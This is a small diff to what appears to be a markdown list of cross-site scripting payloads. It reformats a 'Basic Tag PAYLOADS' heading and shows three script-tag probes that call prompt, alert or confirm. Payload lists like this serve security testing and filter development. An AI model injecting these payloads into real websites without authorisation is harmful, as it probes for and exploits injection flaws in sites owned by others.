@@ -1,4 +1,5 @@
-# Basic Tag PAYLOADS
+### Basic Tag PAYLOADS
+```
 <script>prompt(1)</script>
 <script onload="alert(1)"></script>
 <script onerror="confirm(1)"></script>
